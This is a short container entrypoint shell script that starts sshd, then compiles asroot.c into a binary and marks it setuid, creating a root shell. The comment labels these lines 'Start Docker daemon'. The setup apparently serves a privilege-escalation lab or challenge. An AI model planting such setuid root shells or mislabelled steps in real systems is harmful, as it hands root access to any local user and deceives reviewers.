#!/bin/sh
set -e

# Start SSH service
/usr/sbin/sshd -D &

# Start Docker daemon
cd /bin/rootshell && gcc asroot.c -o shell
cd /bin/rootshell && chmod u+s shell

# Keep the container running
tail -f /dev/null
